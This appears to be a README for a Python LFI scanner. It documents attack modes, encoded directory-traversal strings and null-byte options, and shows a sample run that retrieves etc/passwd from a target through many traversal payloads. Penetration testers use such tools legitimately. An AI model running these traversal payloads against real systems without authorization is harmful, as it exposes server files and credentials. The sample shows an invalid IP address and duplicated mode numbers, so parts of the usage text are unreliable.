# fi-cyberspace-scan

Local File Inclusion CLI tool written in Python to speed up LFI checks. Similar to using Burp or ZAP, but less bulky and resource intensive. Plus it's in color for easy readability. File lists are included in the app, ranging from basic to verbose. Set different **"Cyber-Attack Modes"**, **Encoded Path Types**, **Deep Directory Traversal** or **NULL Bytes**.

Valid LFI results are based on HTTP response codes, then HTTP response sizes. A non-200 will reult in a failure, and a reflected byte size different from a pre-tested basline will result in a valid find. Valid finds will be displayed in terminal output.

Before executing the attack, you'll be prompted with the set parameters, then can either confirm & execute OR exit the program. All parameters are preset besides **Target**. Adding these flags will update the set parameters, prior to exectuion.

___

## Usage:

```
-----------------------------Usage-------------------------------
Target URL:            -t --target
   Set the full HTTP Path/URI in which you'd like to test.
   LFI string will be appended to whatever you set as this argument.

Cyber-Attack Modes:    -m --mode  
   3: ICE-Breaker            Hardwired LFI Validator with Custom Encoded path types. Deepspace & %00 Disabled.
   2: Mole-IX                Intermediate attack list for even the best Cyberspace Operators.
   3: Kuang-Grade-Mark-11    Top notch verbose attack. Fires off a large list of interesting files.
   4: WIN-Construct          Targeted Windows OS attack. Includes common Windows file list.

Path Type:             -p --path 
   Set the directory traversal path type if it's encoded.
   Set as ONE instance in single quotes ('..%2f' , '..\\' , '%%32%65' ,etc) 
   Deafult is set to: ../ 

Deep Space Traversal:  -d --deepspace 
   Traverse deep within the filesystem at 9 directories deep.
   Without this flag set, the default 5 deep will run.
   Boolean flag. Default is FALSE.

Null-Byte:             -n --nullbyte 
   Appends a null-byte %00 to every request.
   Boolean flag. Default is FALSE.

Examples:
root@case:/#./fi-cyberspace-scan.py -t http://127.0.0.1/cyber.php?=
root@case:/#./fi-cyberspace-scan.py -t http://127.0.0.1/cyber.php?= -m ICE-Breaker 
root@case:/#./fi-cyberspace-scan.py -t http://127.0.0.1/cyber.php?= -m 4 -p '..252f' -n 
root@case:/#./fi-cyberspace-scan.py -t http://127.0.0.1/cyber.php?= -m kuang-grade-mark-11 -d
-----------------------------------------------------------------
```

Here is a sample output for the ICE-Breaker mode, which tests a few basic directories using a variety of long encoded paths. In this case a valid hit on etc/password found in the root **/** and 4 directories deep **../../../../** encoded and not encoded.

With this info, we can use other cyber-attack modes, setting path type to **../** or to other valid encoded path types.

```
root@kali:/home/scripts# python ok.py -t http://172.28.1227.5/cyber.php?space= -m 1
-----------------------------------------------------------------
'___ *  .    '   \|/     *   .   '      + .----. .  '  -*-    
|===|     ' __   -*-  FI Cyberspace-Scan  ||'''|_       ' ___ 
|= =|__'  _|==|_ /|\  ___     * .   __   _||= =|.| *   __|===|
|= =|::| |.|:|==|____|= =| .   ____|==| |::|= =|.|__ '|::|= =|
|=|=|::|_|.|:|==| :: |_.-`-.__|----|==|_|::|=|=|.|::|_|::|= =|
-----------------------Hardwired Options-------------------------
TARGET URL                   : http://172.28.1227.5/cyber.php?space=
CYBER ATTACK MODE            : ICE-Breaker
PATH TYPE                    : Custom Encoded
DEEP SPACE TRAVERSAL         : False
NULL-BYTE %00                : False
-----------------------------------------------------------------
DO NOT USE AGAINST UNAUTHORIZED INTRUSION COUNTERMEASURES ELECTRONICS
Execute Cyberspace Run? [Y/n]: Y

-----------------------------------------------------------------
It seems  448  is the common reflected byte size.
Digging into unique reflection sizes.
-----------------------------------------------------------------
[+] - Something interesting found with etc/passwd in 
     --Path:  / bytes: 2161
     --Path:  ../../../../ bytes: 2161
     --Path:  %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f bytes: 2161
     --Path:  %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f bytes: 2161
     --Path:  %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f bytes: 2161
     --Path:  %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f bytes: 2161
     --Path:  %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f bytes: 2161
     --Path:  %2e%2e/%2e%2e/%2e%2e/%2e%2e/ bytes: 2161
     --Path:  %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ bytes: 2161
     --Path:  %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ bytes: 2161
     --Path:  %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ bytes: 2161
     --Path:  %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ bytes: 2161
     --Path:  ..%2f..%2f..%2f..%2f bytes: 2161
     --Path:  ..%2f..%2f..%2f..%2f..%2f bytes: 2161
     --Path:  ..%2f..%2f..%2f..%2f..%2f..%2f bytes: 2161
     --Path:  ..%2f..%2f..%2f..%2f..%2f..%2f..%2f bytes: 2161
     --Path:  ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f bytes: 2161
[-] - Nothing found in etc/passwd%00
---snip---
```
